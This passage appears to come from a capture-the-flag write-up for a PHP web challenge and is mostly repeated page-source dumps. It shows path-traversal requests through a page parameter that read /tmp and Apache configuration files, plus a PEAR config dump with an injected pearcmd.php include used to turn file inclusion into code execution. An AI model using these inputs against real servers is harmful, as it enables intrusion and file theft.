+<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->
+
+<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->
+
+<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->
+
+<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->
+
+<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->
+
+<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->
+
+<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>
+
+<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->
+
+<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->
+
+<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->
+
+<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->
+
+<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->
+
+<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->
+
+  
+
+<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>
+
+</div>
+
+  
+
+</body>
+
+<script>
+
+let message = `
+```
+
+view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/hi.php
+```
+  
+
+<!--
+
+\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~
+
+\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__
+
+\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|
+
+-->
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<title>Why So Serious</title>
+
+<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">
+
+</head>
+
+<body>
+
+<div class="lazarus-pit">
+
+<h1>WHY SO SERIOUS?</h1>
+
+<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>
+
+<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>
+
+  
+
+<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->
+
+<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->
+
+<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->
+
+<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->
+
+<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->
+
+<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->
+
+<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>
+
+<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->
+
+<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->
+
+<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->
+
+<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->
+
+<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->
+
+<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->
+
+  
+
+<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>
+
+</div>
+
+  
+
+</body>
+
+<script>
+
+let message = `
+
+#PEAR_Config 0.9
+
+a:12:{s:7:"php_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/php";s:8:"data_dir";s:80:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/data";s:7:"www_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/www";s:7:"cfg_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/cfg";s:7:"ext_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/ext";s:7:"doc_dir";s:80:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/docs";s:8:"test_dir";s:81:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/tests";s:9:"cache_dir";s:81:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/cache";s:12:"download_dir";s:84:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/download";s:8:"temp_dir";s:80:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/temp";s:7:"bin_dir";s:75:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear";s:7:"man_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+
+main.css
+
+phpinfo.php
+
+whysoserious
+
+whysoserious/pear/man";} `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+  
+
+if (message) {
+
+let currIdx = 0;
+
+let messageLength = message.length;
+
+  
+
+let parts = document.querySelectorAll('.lazarus-pit > div');
+
+for (let i = 0; i < parts.length; i++) {
+
+let partLength = parts[i].innerHTML.length;
+
+  
+
+parts[i].innerHTML = '';
+
+  
+
+for (let j = 0; j < partLength; j++) {
+
+parts[i].innerHTML += message[currIdx % messageLength];
+
+currIdx++;
+
+}
+
+}
+
+}
+
+</script>
+
+</html>
+```
+
+view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/apache2/sites-enabled/000-default.conf
+```
+  
+
+<!--
+
+\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~
+
+\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__
+
+\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|
+
+-->
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<title>Why So Serious</title>
+
+<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">
+
+</head>
+
+<body>
+
+<div class="lazarus-pit">
+
+<h1>WHY SO SERIOUS?</h1>
+
+<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>
+
+<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>
+
+  
+
+<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->
+
+<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->
+
+<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->
+
+<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->
+
+<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->
+
+<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->
+
+<div class="grange">IOUS?WHY SO</div> <div class="prank">S</div><div class="trio">ERIOUS?WHYSO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="poison-ivy">Y</div><div class="grange">SO SERIOUS?W</div><br>
+
+<div class="grange">HY SO SERIOUS</div><div class="mister-freeze">?</div><div class="rupert">W</div><div class="mirror-master">H</div><div class="mettalo">Y</div><div class="marty">S</div><div class="man-bat">O</div><div class="lex-luthor">S</div><div class="killer-moth">E</div><div class="killer-croc">R</div><div class="hideto-katsu">I</div><div class="kabuki-twins">O</div><div class="joker-v2">U</div><div class="ragdoll">S</div><div class="the-joining">?</div><div class="harley-quinn">W</div><div class="trio">HY SO SERIOUS? WHY SO</div> <div class="harley-quinn">S</div><div class="francis-grey">E</div><div class="the-joining">R</div><div class="mercy-graves">I</div><div class="riddlemen">O</div><div class="gearhead">U</div><div class="firefly">S</div><div class="everywhere-man">?</div><div class="dracula">W</div><div class="dave">H</div><div class="count-vertigo">Y</div><div class="mugsy">S</div><div class="cluemaster">O</div> <div class="mugsy">S</div><div class="mettalo">E</div><div class="mirror-master">R</div><div class="arrow">I</div><div class="grange">OUS? WHY SO S</div><br><!-- 8 -->
+
+<div class="grange">ERIOUS? WHY SO SERIOUS? WHY</div> <div class="rhino">S</div><div class="clayface">O</div><div class="catwoman">S</div><div class="blaze">E</div><div class="black-mask">R</div><div class="alfred">I</div><div class="ellen-yin">O</div><div class="chief-angel">U</div><div class="trio">S? WHY SO SE</div><div class="nightwish">R</div><div class="dick-grayson">I</div><div class="thorne">O</div><div class="marty">U</div><div class="sinestro">S</div><div class="robin">?</div><div class="james-gordon">W</div><div class="barbara-gordon">H</div><div class="grange">Y SO SERIOUS? WHY SO SERIOUS?</div><br><!-- 9 -->
+
+<div class="grange">WHY SO SERIOUS? WHY SO SERIOUS? WH</div><div class="batgirl">Y</div><div class="bat-30">S</div><div class="bat-31">O</div><div class="trio">SERIOUS</div><div class="bat-32">?</div><div class="bat-33">W</div><div class="bat-34">H</div><div class="barbara-gordon">Y</div><div class="grange"> SO SERIOUS? WHY SO SERIOUS? WHY SO</div><br><!-- 10 -->
+
+<div class="grange">SERIOUS? WHY SO SERIOUS? WHY SO SERIO</div><div class="rhino">U</div><div class="bat-35">S</div><div class="bat-36">?</div><div class="harley-quinn">W</div><div class="trio">H</div><div class="bat-37">Y</div><div class="bat-38">S</div><div class="bat-35">O</div><div class="grange"> SERIOUS? WHY SO SERIOUS? WHY SO SERIOU</div><br><!-- 11 -->
+
+<div class="grange">S? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO</div><div class="bat-39">S</div><div class="bat-40">E</div><div class="bat-41">R</div><div class="batgirl">I</div><div class="grange">OUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY</div> <br><!-- 12 -->
+
+<div class="grange">SO SERIOUS?WHY SO SERIOUS? WHYSOSERIOUS</div><div class="riddler">?</div><div class="bat-42">W</div><div class="grange">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><br><!-- 13 -->
+
+  
+
+<p>Credits: <a href="[https://codepen.io/cjv/pen/xwXoBW](https://codepen.io/cjv/pen/xwXoBW)">https://codepen.io/cjv/pen/xwXoBW</a></p>
+
+</div>
+
+  
+
+</body>
+
+<script>
+
+let message = `
+
+<VirtualHost *:80>
+
+# The ServerName directive sets the request scheme, hostname and port that
+
+# the server uses to identify itself. This is used when creating
+
+# redirection URLs. In the context of virtual hosts, the ServerName
+
+# specifies what hostname must appear in the request's Host: header to
+
+# match this virtual host. For the default virtual host (this file) this
+
+# value is not decisive as it is used as a last resort host regardless.
+
+# However, you must set it for any further virtual host explicitly.
+
+#ServerName www.example.com
+
+  
+
+ServerAdmin webmaster@localhost
+
+DocumentRoot /var/www/html
+
+  
+
+# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+
+# error, crit, alert, emerg.
+
+# It is also possible to configure the loglevel for particular
+
+# modules, e.g.
+
+#LogLevel info ssl:warn
+
+  
+
+ErrorLog ${APACHE_LOG_DIR}/error.log
+
+CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+  
+
+# For most configuration files from conf-available/, which are
+
+# enabled or disabled at a global level, it is possible to
+
+# include a line for only one particular virtual host. For example the
+
+# following line enables the CGI configuration for this host only
+
+# after it has been globally disabled with "a2disconf".
+
+#Include conf-available/serve-cgi-bin.conf
+
+</VirtualHost>
+
+  
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+
+`.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+  
+
+if (message) {
+
+let currIdx = 0;
+
+let messageLength = message.length;
+
+  
+
+let parts = document.querySelectorAll('.lazarus-pit > div');
+
+for (let i = 0; i < parts.length; i++) {
+
+let partLength = parts[i].innerHTML.length;
+
+  
+
+parts[i].innerHTML = '';
+
+  
+
+for (let j = 0; j < partLength; j++) {
+
+parts[i].innerHTML += message[currIdx % messageLength];
+
+currIdx++;
+
+}
+
+}
+
+}
+
+</script>
+
+</html>```
+
+view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/apache2/apache2.conf
+
+```
+  
+
+<!--
+
+\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~
+
+\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__
+
+\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|
+
+-->
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<title>Why So Serious</title>
+
+<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">
+
+</head>
+
+<body>
+
+<div class="lazarus-pit">
+
+<h1>WHY SO SERIOUS?</h1>
+
+<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>
+
+<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>
+
+  
+
+<div class="penguin">W</div><div class="vicki-vale">H</div><div class="cash">Y</div><div class="superman">S</div><div class="manhunter">O</div> <div class="superman">SERIOUS?</div> <div class="hawkman">WHY SO SERIO</div><div class="lantern">U</div><div class="arrow">S</div> <div class="grange">? WHY SO SERIOUS? WHY SO SE</div><div class="flash">R</div><div class="marion">I</div><div class="zucco">OUS? WHY SO SE</div><div class="tony">RIOUS? W</div><div class="zucco">H</div><div class="maxie">Y</div><div class="zeus">S</div><div class="wrath">O</div> <br> <!-- 1 -->
+
+<div class="grange">S</div><div class="ventriloquist">E</div><div class="toyman">R</div><div class="zeus">I</div><div class="toymaker">O</div><div class="rupert">U</div><div class="thorne">S</div><div class="terrible">?</div> <div class="trio">WHY SO SERIOUS? WHY</div> <div class="temblor">S</div><div class="hugo">O</div> <div class="grange">SERIOUS?</div><div class="strange">W</div><div class="grange">HY</div> <div class="spellbinder">S</div><div class="grange">O SERIOUS?</div><div class="solomon">W</div><div class="trio">HY SO SERIOUS? WHY SO</div><div class="grundy">S</div><div class="smoke">E</div><div class="sinestro">R</div><div class="shadow">I</div><div class="thief">O</div><div class="penguin">U</div><div class="grange">S</div> <br><!-- 2 -->
+
+<div class="grange">? WHY</div> <div class="scorn">S</div><div class="bat-one">O</div><div class="rumor">S</div><div class="bat-two">E</div><div class="trio">RIOUS? WHY SO SERIO</div><div class="bat-three">U</div><div class="bat-four">S</div><div class="bat-five">?</div><div class="bat-six">W</div><div class="riddler">H</div><div class="grange">Y SO</div><div class="bat-seven">S</div><div class="rumor">E</div><div class="bat-eight">R</div><div class="bat-nine">I</div><div class="riddlemen">O</div><div class="bat-ten">U</div><div class="grange">S? W</div><div class="rhino">H</div><div class="bat-eleven">Y</div><div class="bat-twelve">S</div><div class="bat-thirteen">O</div><div class="trio">SERIOUS? WHY SO SER</div><div class="bat-fourteen">I</div><div class="bat-fifteen">O</div><div class="bat-sixteen">U</div><div class="bat-seventeen">S</div><div class="spellbinder">?</div> <div class="grange">WHY S</div><br><!-- 3 -->
+
+<div class="grange">O SERIOUS?</div><div class="mugsy">W</div><div class="bat-eighteen">H</div><div class="trio">Y SO SERIOUS? WHY S</div><div class="ragdoll">O</div><div class="bat-nineteen">S</div><div class="bat-twenty">E</div><div class="trio">RIOUS? WHYSOSERIOUS? WHY SO SERIOUS?</div><div class="bat-twentyone">W</div><div class="bat-twentytwo">H</div><div class="grange">Y SO SERIO</div><br><!-- 4 -->
+
+<div class="grange">US? WHY SO</div> <div class="riddler">S</div><div class="bat-twentythree">E</div><div class="bat-twenty-four">R</div><div class="trio">IOUS? WHY SO SERIOUS?</div> <div class="joker">WHY SO SERIOUS?</div> <div class="trio">WHY SO SERIOUS? WHY S</div><div class="bat-twentyfive">O</div><div class="riddler">S</div><div class="grange">ERIOUS? WHY</div><br><!-- 5 -->
+
+<div class="grange">SO SERIOUS?</div> <div class="bat-twentysix">W</div><div class="trio">HY SO SERIOUS? WHY SO SERIOUS? WHY SO SERIOUS? WHY SO SERI</div><div class="punch">O</div><div class="judy">U</div><div class="grange">S? WHY SO SER</div><br><!-- 6 -->
+
